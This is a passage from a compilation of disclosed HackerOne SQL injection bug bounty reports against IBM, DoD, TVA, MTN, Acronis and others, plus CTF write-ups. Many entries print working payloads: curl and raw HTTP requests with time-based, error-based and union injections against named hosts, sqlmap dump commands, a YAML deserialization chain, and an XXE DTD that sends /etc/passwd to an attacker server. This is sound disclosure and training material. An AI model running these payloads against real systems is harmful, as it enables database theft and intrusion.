      analyze_result = conn.protected_attribute.with_parameters(params) do
        conn.execute explain_analyze
      end

      fail ActiveRecord::Rollback
    end

    if config[:use_protected_schema]
      ProtectedAttribute::SchemaUtility.with_requester(user) do
        block.call
      end
    else
      block.call
    end
# ...
```

The code is written so that it would wrap each analyze query in a transaction. This avoids permanent side effects of running the query, because `EXPLAIN ANALYZE` will still execute the SQL query. The interpolation of the `raw_sql` variable can be used to escape the current transactions and make any changes persist. The following part is used to jump out of the transaction:

```sql
SELECT
        1
;

ROLLBACK
;
```

Then, a payload is injected into a table called `user_versions` and a comment identifier (`-- `) is used to block the `ROLLBACK` statement that is appended by the `transaction` block. The `user_versions` table keeps a paper trail of changes on `User` objects. For example, when someone changes their username, the application keeps a snapshot of the previous object in the `user_versions` table. HackerOne uses a gem called [paper_trail](https://github.com/paper-trail-gem/paper_trail) for this. This gem comes with a useful function to reinstantiate an old version of an object, called `reify`. When this method is called, the YAML from the `object` attribute is deseriealized and is used to initialize the class stored in the `item_type` column. This method inherently trusts the object stored in `object` however. Because the attacker can persist a new version, it can control the object that would be deserialized. In the past, multiple YAML deserialization techniques have been published. For the proof of concept, I reused [Stratum Security's](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) payload from 2021.

There is only one place where the `reify` method is called on a `UserVersion` object, and it's through the historic users feature. It's using the following code:

```ruby
def index
  if params[:historic_user_input].present?
    if params[:historic_user_input].include? '@'
      versions = UserVersion.where(email: params[:historic_user_input]).order(id: :asc).to_a
      current_owner = User.find_by(email: params[:historic_user_input])
    else
      # ...
    end

    # ...

    original_user = versions.first.reify
```

This code will pull all `UserVersion` objects based on the `email` attribute and sorts them based on the primary key ascending. Because we also can control the `email` attribute through the SQL injection, we need to simply persist a version with a value that is unique in the table, such as `uniquekeywordtotriggercode@hackerone.com`. When the page is loaded with that as the value for the `historic_user_input`, it will only return our injected object and reinstantiate it, leading to the execution of arbitrary ruby code or, in this case, a command.

## Impact

Execution of arbitrary ruby code.

---

### [sql injection via https://setup.p2p.ihost.com/](https://hackerone.com/reports/1567516)

- **Report ID:** `1567516`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @exploitmsf
- **Bounty:** - usd
- **Disclosed:** 2022-06-17T17:47:30.844Z
- **CVE(s):** -

**Summary (team):**

A SQL Injection against an IBM domain was reported to IBM, analyzed and has been remediated. Thank you to exploitmsf.
.

---

### [SQL Injection on https://████████/](https://hackerone.com/reports/232378)

- **Report ID:** `232378`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2022-05-12T19:59:55.610Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
https://████ is vulnerable to SQL Injection.

**Description:**
The `███████` parameter in `https://█████████/██████` does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!

## Impact
This is a **high impact** vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel! 

## Step-by-step Reproduction Instructions
#### Proof of Concept #1:
1. Open up your terminal!
2. Paste this command 

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/██████████?█████████=K' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary $'█████=K*\' OR SLEEP(10) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=███████&emailid2=█████████' \
    $'https://██████/████████'
```
3. Now the server will sleep for 10 seconds and then respond! 


#### Proof of Concept #2: 
```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/███████?█████=K' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary $'█████=K*\' OR updatexml(null,concat(0x3a3a,version()),null) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=█████████&emailid2=██████████' \
    $'https://██████/███'
```
You will see: "<br><br>You have this list added to your current optionsXPATH syntax error: '::`████`'"
which is the MySQL version! 

**information:**
Current User: `███████@localhost`
Databases: `█████`
Version: `███`

## Suggested Mitigation/Remediation Actions
Sanitize sanitize sanitize!!

Thanks as always ;)
-Corben Douglas (@sxcurity)

---

### [SQL Injection on █████](https://hackerone.com/reports/277380)

- **Report ID:** `277380`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2022-05-12T19:57:32.374Z
- **CVE(s):** -

**Vulnerability Information:**

#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does not properly sanitize ' characters, allowing an attacker to execute SQL queries!

### Impact

This could potentially expose sensitive information because an attacker could potentially dump the databases on this server!

### Step-by-step Reproduction Instructions

    1.) Open Firefox or any browser
    2.) Visit `https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil`
    3.) You will see the MySQL version in the response => `██████████`

User - `███████`
payload => `https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil`

Database - `████`
payload => `https://██████/█████████████=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil`

██████
### Suggested Mitigation/Remediation Actions

Sanitize input!

Thanks!
- Corben Douglas [@sxcurity](https://twitter.com/sxcurity)

---

### [SQL injextion via vulnerable doctrine/dbal version](https://hackerone.com/reports/1390331)

- **Report ID:** `1390331`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Nextcloud
- **Reporter:** @nickvergessen
- **Bounty:** - usd
- **Disclosed:** 2022-05-11T14:08:04.479Z
- **CVE(s):** CVE-2021-43608

**Vulnerability Information:**

## Summary:
SQL injection via limit parameter on user facing APIs

## Steps To Reproduce:
Run security scanner:

  1. REPORT /remote.php/dav/comments/files/1985
  1. XML input oc:filter-comments.oc:limit#text was set to 1'"
  1. You have an error in your SQL syntax

## Supporting Material/References:
For more details see:
https://github.com/nextcloud-gmbh/h1/issues/197

## Impact

Full flexed SQL injection via user provided input

**Summary (team):**

Advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-539w-xvpg-wj29

---

### [SQL injection in URL path processing on www.ibm.com](https://hackerone.com/reports/1527284)

- **Report ID:** `1527284`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @asterite
- **Bounty:** - usd
- **Disclosed:** 2022-05-06T18:37:54.523Z
- **CVE(s):** -

**Summary (team):**

A blind SQL injection in URL path processing on www.ibm.com was reported to IBM, analyzed and has been remediated. Thank you to @asterite.

**Summary (researcher):**

Blind SQL injection was present in URL path processing on www.ibm.com. An interesting thing is that the vulnerability was present in, essentially, any path, one could put a single quote right after the leading slash in path to start exploiting it.

SQL query result was not reflected in server response and server response after exploitation attempt was always erroneous, but it differed depending on whether SQL query failed or not.  If SQL query (influenced by our injection attack vector) did not fail, server responded with an endless redirect. If SQL query failed, server responded with status 500. So, it was possible to distinguish those two cases and use boolean error-based exfiltration technique.

Another complication was that spaces and line breaks (`\n`) could not be used in injected payload, but it was possible to overcome this and exploit the vulnerability without them.

---

### [SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015](https://hackerone.com/reports/1125752)

- **Report ID:** `1125752`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Tennessee Valley Authority
- **Reporter:** @yassinek3ch
- **Bounty:** - usd
- **Disclosed:** 2022-04-26T19:33:04.174Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
 
i've found this subdomain ```soa-accp.glbx.tva.gov``` also is vulnerable to SQLI through /api/ path

## Steps To Reproduce:

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-``` hostname dumped

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-``` 

Microsoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \n\tNov  6 2020 18:19:52 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n

also you can retest it through time bassed trick

```time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"```

{F1230364}

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.

---

### [SQL Injection in █████](https://hackerone.com/reports/1489744)

- **Report ID:** `1489744`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @lubak
- **Bounty:** - usd
- **Disclosed:** 2022-04-07T19:59:52.168Z
- **CVE(s):** -

**Vulnerability Information:**

## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl command injecting query, returning current database:
curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

POC 3 - curl command injecting query, returning current user:
 curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

## Suggested Mitigation/Remediation Actions
The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.

---

### [SQL Injection at https://files.palantir.com/ due to CVE-2021-38159](https://hackerone.com/reports/1525200)

- **Report ID:** `1525200`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Palantir Public
- **Reporter:** @haxor31337
- **Bounty:** - usd
- **Disclosed:** 2022-04-05T08:05:09.247Z
- **CVE(s):** CVE-2021-38159

**Summary (team):**

A vulnerability was discovered in an Internet-facing asset (files.palantir.com). A proof of concept (POC) was developed and used to validate the finding. The vulnerability was patched and resolved.

**Summary (researcher):**

Blog about this vulnerability published. You can read full detail here:
https://blog.viettelcybersecurity.com/moveit-transfer-cve/

---

### [Saving Christmas from Grinchy Gods](https://hackerone.com/reports/1434017)

- **Report ID:** `1434017`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @akshansh
- **Bounty:** - usd
- **Disclosed:** 2022-02-01T17:42:56.925Z
- **CVE(s):** -

**Summary (team):**

#

**Summary (researcher):**

It was a fun CTF to play had some good learning on thinking of how to approach real world targets and more things we can try while testing any target , some nudges were good and reminded of scenarios of actual microservices are built where these security issues can be present
huge shoutouts to  Adam and Congon4tor and h1 team for making this CTF live

The writeup is posted at  https://medium.com/@akshanshjaiswal/h1-ctf-hacky-holidays-writeup-20722289be03

---

### [SQL Injection and plaintext passwords via User Search](https://hackerone.com/reports/703819)

- **Report ID:** `703819`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @xyantix
- **Bounty:** - usd
- **Disclosed:** 2022-01-14T18:42:53.186Z
- **CVE(s):** -

**Summary (team):**

An identified SQL Injection vulnerability was reported to IBM found within an IBM asset. It has been analyzed, and resolved. We thank the xyantix for reporting this vulnerability.

---

### [SQL Injection leads to retrieve the contents of an entire database. ](https://hackerone.com/reports/1002641)

- **Report ID:** `1002641`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @u-itachi
- **Bounty:** - usd
- **Disclosed:** 2021-12-29T14:28:56.819Z
- **CVE(s):** -

**Summary (team):**

SQL Injection leads to retrieve the contents of an entire database.

---

### [SQL Injection in IBM access control panel & Broken access in admin panel](https://hackerone.com/reports/1355817)

- **Report ID:** `1355817`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @thecyberguy0
- **Bounty:** - usd
- **Disclosed:** 2021-10-18T19:50:49.791Z
- **CVE(s):** -

**Summary (team):**

An application endpoint was found to be vulnerable to SQL Injection caused by a lack of sanitation on the client_id parameter. An adversary would eventually be able to read sensitive data from the database, or modify it as well as to execute administration operations. This was reported to IBM and remediated.

---

### [SQL injection located in `███` in POST param `████████` ](https://hackerone.com/reports/1262757)

- **Report ID:** `1262757`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @brumens
- **Bounty:** - usd
- **Disclosed:** 2021-09-09T20:00:36.835Z
- **CVE(s):** -

**Vulnerability Information:**

Hey DoD security team!

I was able to exploit an SQL injection [1] in one of your domains.

# Description

An SQL injection [1] was discovered in domain *https://████████/██████* in the parameter *██████████*. The SQL injection was located in a *WHERE* statment fallowed by a *INT* value.
The vulnerable parameter gave an indication quick with an *SQL syntax* error. That exposed it was an *████* database [2] in the backend.
 
# Proof Of Concept
Discovered the SQL injection by inputting an random value to trigger an SQL syntax error.
Discover_Payload: **██████████**
████

The fallowing payload was used for the SQL injection to be be triggered 
Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
██████

Full exploit and gather information from the MYSQL database:
████


## References
[1] https://portswigger.net/web-security/sql-injection - *SQL injection explained*
[2] https://www.mysqltutorial.org/mysql-where/ - *MYSQL WHERE statment explained*
[3] https://www.mysql.com/ - *MYSQL Database*

## Impact

An attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)

## System Host(s)
███████

## Affected Product(s) and Version(s)
The whole database is affected and I'm able to gather all information stored in it.

## CVE Numbers


## Steps to Reproduce
1. Go to the domain **
2. Now intercept the request with Burp Suite.
3. Replace the *raw* data with the fallowing:
```
POST /██████ HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: https://█████████
Referer: https://████████/█████████
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

██████=2021█████
```
4 . Save request in Burp Suite => Right click => save item + *Name it*.
5. Run sqlmap command: **sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p ██████████**.
It will quick discover the *███* to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.
as fallowing: (Only gather table and stoped after just as a proof of concept)
████

## Suggested Mitigation/Remediation Actions
Make sure to filter out SQL syntax and quotes and never trust user input.

---

### [SQL injection [futexpert.mtngbissau.com]](https://hackerone.com/reports/924855)

- **Report ID:** `924855`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @pisarenko
- **Bounty:** - usd
- **Disclosed:** 2021-09-09T11:40:30.512Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[add summary of the vulnerability]

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Poc Request

`POST /signin/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://futexpert.mtngbissau.com/
Cookie: PHPSESSID=sn56alvthfp0l0vvoku34jd2i4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 82
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive`

`phone_number=0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z&pin=1&submit=Continuar`

Tests performed:
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.438
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.394
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.391
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.396
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.802
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.436
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.435

## Impact

sql

**Summary (researcher):**

Proof of Exploit
SQL query - SELECT user FROM dual
CORPORATEBULKSMS

---

### [SQL Injection in agent-manager](https://hackerone.com/reports/962889)

- **Report ID:** `962889`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Acronis
- **Reporter:** @bourbon
- **Bounty:** - usd
- **Disclosed:** 2021-08-16T09:37:25.718Z
- **CVE(s):** -

**Vulnerability Information:**

1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27
2.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27

## Impact

sql injection

---

### [Blind SQL Injection ](https://hackerone.com/reports/1069531)

- **Report ID:** `1069531`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @lu3ky-13
- **Bounty:** - usd
- **Disclosed:** 2021-08-14T18:34:29.431Z
- **CVE(s):** -

**Vulnerability Information:**

hello dear support

I have found Blind SQL Injection on https://futexpert.mtngbissau.com/signin/
parameters injectable phone_number=0&pin=1&submit=Continuar via post
URL:https://futexpert.mtngbissau.com/signin/
Post: email=0
my payload : phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar

HTTP request
==========
```
POST /signin/ HTTP/1.1
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://futexpert.mtngbissau.com
Connection: close
Referer: https://futexpert.mtngbissau.com/signin/
Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5
Upgrade-Insecure-Requests: 1

phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar

```

if you need more info I'm here thank you

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

**Summary (researcher):**

How I Found Sql Injection on 8x8 , Cengage ,Comodo ,Automattic ,intel ,IBM ,MTN Group ,uis.cam.ac.uk ,volvocars.biz ,asus.com
https://ahmadaabdulla.medium.com/how-i-found-sql-injection-on-8x8-cengage-comodo-automattic-20-company-c296d1a09f63

---

### [SQLi on █████████](https://hackerone.com/reports/954667)

- **Report ID:** `954667`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hexagr
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T19:24:12.048Z
- **CVE(s):** -

**Summary (team):**

Researcher discovered a Boolean-based SQLi on a Dept. of Defense asset.

**Summary (researcher):**

Discovered a boolean-based SQLi on a Dept. of Defense asset.

---

### [SQL Injection on the administrator panel](https://hackerone.com/reports/865436)

- **Report ID:** `865436`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @z3lox
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T03:50:17.043Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team. The admin panel of the website is mtngbissau.com or is vulnerable to sql attack via https://mtngbissau.com/webadmin/index.php

## Request 

```
POST /webadmin/index.php HTTP/1.1
Host: mtngbissau.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://mtngbissau.com/webadmin/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close
Cookie: PHPSESSID=74db1535be320f591b6106253ad77191; SERVERID68971=262072|Xq8Kv|Xq8Ip
Upgrade-Insecure-Requests: 1

login=user'&pass=uesse
```
Confirmation of the vulnerability with sqlmap

```
[*] starting @ 21:06:44 /2020-05-03/

[18:05:44] [INFO] parsing HTTP request from 'post'
[18:06:10] [INFO] resuming back-end DBMS 'mysql' 
[18:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin
---
[18:06:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:06:45] [INFO] fetched data logged to text files under '/home/kira/.sqlmap/output/mtngbissau.com'


```

## Impact

Web application is vulnerable to SQL injection, allowing access to data

---

### [blind sql on  [ https://argocd.upchieve.org/login?return_url=id= ]](https://hackerone.com/reports/1278928)

- **Report ID:** `1278928`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** UPchieve
- **Reporter:** @ben_lay
- **Bounty:** - usd
- **Disclosed:** 2021-07-28T16:14:48.790Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[i have discoverd a blind sql on your site login page which i confirmed using two scenarios to confirm its existance.]


## Steps To Reproduce:
[add details for how we can reproduce the issue]


use the following payloads 
this one retured a 200 ok response confirming sql vulnerability existance
id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136

this one was blocked confirming the first one is going through and can be weponised

70418291&comment_id=291751-benchmark(1000000000,1-1)&hash=f42ffae0449536cfd0419826f3adf136


example link on how to reproduce  [ https://argocd.upchieve.org/login?return_url=id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136]


Why -sleep(5), -benchmark(1000000000,1-1) payloads were used? I suspected that comment_id was processed as integer and was unescaped in the query so int-sleep(t) is a valid construction whatever the full query is, which doesn't require various quote/parenthesis tests for the quick manual confirmation. I found it also useful when WAF/filters block the quotes.
The severity was set to High because I propose Critical only for content injections:)

## Supporting Material/References:

[ https://owasp.org/www-community/attacks/Blind_SQL_Injection ]
[https://gerbenjavado.com/manual-sql-injection-discovery-tips/]



## Recommendations for Fixing/Mitigation
[The only sure way to prevent SQL Injection attacks is input validation and parametrized queries including prepared statements. The application code should never use the input directly. The developer must sanitize all input, not only web form inputs such as login forms.]

## Impact

The impact SQL injection can have on a business is far-reaching. A successful attack may result in the unauthorized viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights to a database, all of which are highly detrimental to a business.

---

### [ccc ctf ](https://hackerone.com/reports/1216085)

- **Report ID:** `1216085`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @shamollash
- **Bounty:** 100 usd
- **Disclosed:** 2021-06-23T16:18:55.665Z
- **CVE(s):** -

**Vulnerability Information:**

██████████

will send  detailed report later

## Impact

can get admin credentials

**Summary (researcher):**

We are given this website 

	https://ccc.h1ctf.com/

We can register a user which is assigned a user hash. In our case we got `8y399q` as user hash. Once logged in the page `/u/8y399q` just says:


	: Remote File list not found


The website points to a twitter account `https://twitter.com/DesignsCcc`. There we find a picture with a browser opened on the website we are attacking. One tab of the browser seems to point to: `/error_-_-_log.txt`

We are able to confirm that this file exists and it contains

	File: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found
	File: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found
	File: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found
	File: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found
	File: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found

One of the buckets is intersting becaus it contains an hint towards XXE:

```
https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://patopirata.com/x"> %ext;
]>
<r></r>
```

After a long struggle on many dead ends, and a couple of rickrollings we started wondering how can we make the site read a remote list of files. 

At this point the key observation is that the log file above seems to suggest that the site will query a files.xml on AWS S3 with a predictable name:

	h1-MYHASH.s3.eu-west-2.amazonaws.com/files.xml


So we went to AWS console and put an evil xml file in a public s3 bucket


```
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://MYSERVER:8080/ev.xml">
    %sp;
    %param1;
    ]>
   <r>&exfil;</r>
```

We were able to confirm the XXE vulnerability and after a lot of trial and error, working with the external DTD (in order not to change the xml on S3) we came up with this payload in the external dtd `ev.xml`:


```xml
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param "<!ENTITY &#37; exfil SYSTEM 'ftp://MYSERVER:2121/%data;'>">
%param;
%exfil;
```

For exfiltration we are using the excellent tool `https://github.com/staaldraad/xxeserv`


Having php  (knowing the author of this challenge we suspected that), is very useful: we can work with filters to compress and encode data in order to easily exfiltrate even "big" files. 

In particular we started looking at /etc/nginx/nginx.conf (mentioned by the twitter account of the developers) which contains usual include directives:

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

...
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
```

The default virtual host config `/etc/nginx/sites-enabled/default` is all commented out, so it's not the running configuration, but it contains an important clue:

```
#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
#
```

Moving on to `ccc.h1ctf.com/2b5d2b11513d2c9b` we do some recon in there and find a `.git/HEAD` file. We cannot find much else in the .git directory apart from the configuration .git/config

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/ccc-labs/pinger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

We now have the source code of the pinger service where we understand that we have to look at

	https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=XXX

Key point is in the Ping model source code:

`https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10`


```
class Ping
{

    public static function send( $id ){
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
        $d = Db::connect()->prepare($sql);
        $d->execute();
        //Confirm we've found a matching row in the database
        if( $d->rowCount() == 1 ){
            $host = $d->fetch();
            $ip = $host["ip"];
            $packet_size = intval($host["packet_size"]);
            //make sure PING packet size between 1 and 65527
            if( $packet_size > 0 && $packet_size < 65528 ) {
                //check IP is a valid IPv4 Address
                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
                    //SEND 4 PING PACKETS IN THE BACKGROUND
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
                }
            }
        }
    }

}
```


The service is clarly vulnerable to SQL injection, but given the validation applied to `$packet_size` and `$ip` we are not able to do nothing but actually ping something. 

*But* we have some room in `$packet_size` to put ascii codes of relevant characters. So in the end a request like the one below will exifltrate Nth character of the admin password:

```
GET /2b5d2b11513d2c9b/api/ping?
id=-1+union+all+select+1,'MYSERVER',ascii(substr(password,N,1))+from+user+where+username='admin'%23 HTTP/1.1
```

In particular it will generate ICMP packets towards my server

```
10:17:39.290067 eth0  In  IP 18.216.97.43 > x.y.z.w: ICMP echo request, id 223, seq 1, length 93
```

Here length 93 minus 8 for overhead will give ASCII 85 which is `U`, first character of the admin password. Repeating the exercise many times, sleeping one minute between request or, in my case, using a server with many different ip address will give the admin password `Ud79^1HHJ$W*IObaKdQgI`.

Logging in the admin dashboard of pinger we get the flag:

````
████
```

---

### [SQL injection on admin.acronis.host development web service](https://hackerone.com/reports/923020)

- **Report ID:** `923020`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Acronis
- **Reporter:** @stealthy
